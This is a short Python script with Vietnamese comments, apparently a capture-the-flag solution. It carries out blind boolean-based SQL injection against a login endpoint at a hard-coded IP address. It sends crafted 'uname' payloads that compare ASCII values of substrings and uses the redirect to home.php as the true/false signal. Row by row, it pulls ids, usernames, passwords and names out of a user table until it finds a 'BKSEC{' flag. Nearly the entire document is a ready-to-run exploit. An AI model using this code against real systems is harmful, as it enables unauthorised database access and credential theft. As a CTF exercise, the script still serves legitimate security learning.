import requests
import string
import sys
import urllib3

# Tắt cảnh báo SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "http://103.77.175.40:8021/login-check.php" 

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Tập hợp ký tự có thể có (đã bao gồm dấu ':' để phân tách cột)
chars = string.ascii_letters + string.digits + "{}_-@!$*:"

def exploit(query):
    extracted_string = ""
    flag_found = False
    
    for i in range(1, 200): 
        char_found = False
        for c in chars:
            payload = f"admin' AND ASCII(SUBSTRING(({query}), {i}, 1)) = {ord(c)}-- -"
            data = {
                "uname": payload, 
                "password": "123"
            }
            
            try:
                r = requests.post(
                    TARGET_URL, 
                    data=data, 
                    allow_redirects=False, 
                    proxies=proxies, 
                    verify=False
                )
                
                if "home.php" in r.headers.get("Location", ""):
                    extracted_string += c
                    sys.stdout.write(f"\r    [+] Đang tải: {extracted_string}")
                    sys.stdout.flush()
                    char_found = True
                    break
                    
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Lỗi kết nối: {e}")
                sys.exit(1)
                
        # Nếu duyệt qua hết bộ ký tự mà không thấy (hết chuỗi)
        if not char_found:
            break
            
        # [QUAN TRỌNG] Kiểm tra xem chuỗi hiện tại đã hoàn thiện format cờ chưa
        if "BKSEC{" in extracted_string and extracted_string.endswith("}"):
            flag_found = True
            break # Dừng ngay vòng lặp dò ký tự của dòng này để tiết kiệm thời gian
            
    return extracted_string, flag_found

if __name__ == "__main__":
    print("=== BẮT ĐẦU QUÉT TÌM FLAG (CHẾ ĐỘ AUTO-STOP) ===")
    print("Định dạng dữ liệu: id : uname : pwd : name")
    print("-" * 50)
    
    row = 0
    while True:
        query = f"SELECT CONCAT_WS(':', id, uname, pwd, name) FROM user_info LIMIT {row},1"
        
        print(f"\n[*] Đang quét dòng thứ {row + 1}...")
        result, is_flag = exploit(query)
        
        if result == "":
            print(f"\n[!] Đã quét hết {row} dòng nhưng không tìm thấy bảng ghi nào nữa.")
            break
            
        # Kiểm tra cờ báo hiệu từ hàm exploit hoặc kiểm tra thủ công chuỗi kết quả
        if is_flag or "BKSEC{" in result:
            print(f"\n\n[v] BINGO! Tìm thấy Flag tại dòng {row + 1}!")
            print(f"[=>] DỮ LIỆU: {result}")
            print("[!] Đã đạt mục tiêu. Tự động dừng quét!")
            break
            
        row += 1